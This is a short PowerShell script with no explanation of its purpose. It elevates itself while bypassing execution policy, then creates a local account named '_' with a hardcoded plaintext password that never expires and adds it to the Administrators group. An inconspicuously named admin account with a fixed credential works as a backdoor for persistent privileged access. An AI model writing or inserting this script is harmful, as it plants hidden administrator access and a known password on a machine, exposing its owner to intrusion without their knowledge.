if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
}

$Password = ConvertTo-SecureString "Fast2manage!" -AsPlainText -Force
New-LocalUser -Name "_" -Password $Password
Set-LocalUser -Name "_" -PasswordNeverExpires $true
Add-LocalGroupMember -Group "Administrators" -Member "_"

pause

